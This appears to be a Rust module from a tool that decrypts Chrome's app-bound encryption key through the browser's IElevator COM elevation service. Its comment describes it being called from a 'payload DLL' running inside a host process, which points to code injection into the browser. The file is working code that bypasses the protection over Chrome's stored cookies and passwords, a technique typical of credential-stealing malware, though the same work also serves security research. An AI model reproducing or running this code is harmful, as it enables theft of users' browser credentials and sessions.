//! Chrome elevation-service client: IElevator::DecryptData for the app-bound
//! key. Mirrors chrome/browser/os_crypt/app_bound_encryption_win.cc exactly:
//! CoCreateInstance(CLSID, LOCAL_SERVER, IID) + CoSetProxyBlanket with
//! PKT_PRIVACY / IMPERSONATE / DYNAMIC_CLOAKING, BSTR in/out.
//!
//! No panics on this path: the payload DLL calls it on a worker thread where
//! a panic would abort the host process.

use crate::ffi::*;
use core::ptr::null_mut;

const RPC_E_CHANGED_MODE: HRESULT = 0x80040106u32 as i32;
const S_FALSE: HRESULT = 1;

pub fn hr_name(hr: HRESULT) -> &'static str {
    match hr as u32 {
        0x00000000 => "S_OK",
        0x0004A001 => "kSuccessShouldReencrypt (success)",
        0x80040106 => "RPC_E_CHANGED_MODE",
        0x80040111 => "CLASS_E_NOAGGREGATION",
        0x80040154 => "REGDB_E_CLASSNOTREG",
        0x800401F0 => "CO_E_NOTINITIALIZED",
        0x80070005 => "E_ACCESSDENIED",
        0x80004005 => "E_FAIL",
        0x8000FFFF => "E_UNEXPECTED",
        0x80029C4A => "TYPE_E_CANTLOADLIBRARY",
        0x80080005 => "CO_E_SERVER_EXEC_FAILURE",
        0x8004A001 => "kErrorCouldNotObtainCallingProcess",
        0x8004A003 => "kErrorCouldNotDecryptWithUserContext",
        0x8004A004 => "kErrorCouldNotDecryptWithSystemContext",
        0x8004A007 => "kValidationDidNotPass",
        0x8004A008 => "kErrorCouldNotObtainPath",
        0x8004A00B => "kErrorInvalidValidationData",
        _ => "unknown",
    }
}

fn failed(hr: HRESULT) -> bool {
    hr < 0
}

struct ComErr {
    hr: HRESULT,
    msg: String,
}

impl ComErr {
    fn new(hr: HRESULT, msg: String) -> Self {
        ComErr { hr, msg }
    }
}

pub fn decrypt_app_bound(payload: &[u8]) -> Result<Vec<u8>, String> {
    if payload.is_empty() {
        return Err("empty app-bound payload".to_string());
    }
    if payload.len() > u32::MAX as usize {
        return Err("app-bound payload too large".to_string());
    }
    unsafe {
        let hr = CoInitializeEx(null_mut(), COINIT_APARTMENTTHREADED);
        let need_uninit = hr == S_OK || hr == S_FALSE;
        if failed(hr) && hr != RPC_E_CHANGED_MODE {
            return Err(format!(
                "CoInitializeEx failed: hr=0x{:08x} ({})",
                hr as u32,
                hr_name(hr)
            ));
        }
        let first = com_decrypt_inner(payload);
        let out = match first {
            Err(e) if e.hr == TYPE_E_CANTLOADLIBRARY => {
                // Stale typelib registration (Chrome upgrade left HKLM
                // pointing at a deleted version dir). Repair per-user and
                // retry once.
                match crate::typelib::ensure_elevator_typelib() {
                    Ok(exe) => match com_decrypt_inner(payload) {
                        Err(e2) => Err(format!(
                            "{} [typelib heal via {exe} did not help]",
                            e2.msg
                        )),
                        Ok(k) => Ok(k),
                    },
                    Err(he) => Err(format!("{} [typelib heal failed: {he}]", e.msg)),
                }
            }
            Err(e) => Err(e.msg),
            Ok(k) => Ok(k),
        };
        if need_uninit {
            CoUninitialize();
        }
        out
    }
}

unsafe fn com_decrypt_inner(payload: &[u8]) -> Result<Vec<u8>, ComErr> {
    let mut obj: LPVOID = null_mut();
    let hr = CoCreateInstance(
        &CLSID_ELEVATOR_CHROME,
        null_mut(),
        CLSCTX_LOCAL_SERVER,
        &IID_IELEVATOR_CHROME,
        &mut obj,
    );
    if failed(hr) || obj.is_null() {
        return Err(ComErr::new(
            hr,
            format!(
                "CoCreateInstance failed: hr=0x{:08x} ({})",
                hr as u32,
                hr_name(hr)
            ),
        ));
    }
    let hr = CoSetProxyBlanket(
        obj,
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        null_mut(),
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        null_mut(),
        EOAC_DYNAMIC_CLOAKING,
    );
    if failed(hr) {
        com_release(obj);
        return Err(ComErr::new(
            hr,
            format!(
                "CoSetProxyBlanket failed: hr=0x{:08x} ({})",
                hr as u32,
                hr_name(hr)
            ),
        ));
    }
    let ct = SysAllocStringByteLen(payload.as_ptr(), payload.len() as u32);
    if ct.is_null() {
        com_release(obj);
        return Err(ComErr::new(-1, "SysAllocStringByteLen failed (OOM)".to_string()));
    }
    let mut pt: BSTR = null_mut();
    let mut last_error: DWORD = 0;
    let hr = com_decrypt_call(obj, ct, &mut pt, &mut last_error);
    SysFreeString(ct);
    if failed(hr) {
        if !pt.is_null() {
            SysFreeString(pt);
        }
        com_release(obj);
        return Err(ComErr::new(
            hr,
            format!(
                "DecryptData failed: hr=0x{:08x} ({}) last_error=0x{last_error:08x}",
                hr as u32,
                hr_name(hr)
            ),
        ));
    }
    if pt.is_null() {
        com_release(obj);
        return Err(ComErr::new(
            -1,
            "DecryptData succeeded but returned null plaintext".to_string(),
        ));
    }
    let n = SysStringByteLen(pt) as usize;
    let bytes = core::slice::from_raw_parts(pt as *const u8, n).to_vec();
    SysFreeString(pt);
    com_release(obj);
    Ok(bytes)
}

unsafe fn com_decrypt_call(
    obj: LPVOID,
    ct: BSTR,
    pt: *mut BSTR,
    le: *mut DWORD,
) -> HRESULT {
    let vtbl = *(obj as *mut *const usize);
    let slot = *vtbl.add(VTBL_DECRYPT_DATA);
    let f: DecryptDataFn = core::mem::transmute::<usize, DecryptDataFn>(slot);
    f(obj, ct, pt, le)
}

unsafe fn com_release(obj: LPVOID) {
    let vtbl = *(obj as *mut *const usize);
    let slot = *vtbl.add(VTBL_RELEASE);
    let f: ReleaseFn = core::mem::transmute::<usize, ReleaseFn>(slot);
    f(obj);
}
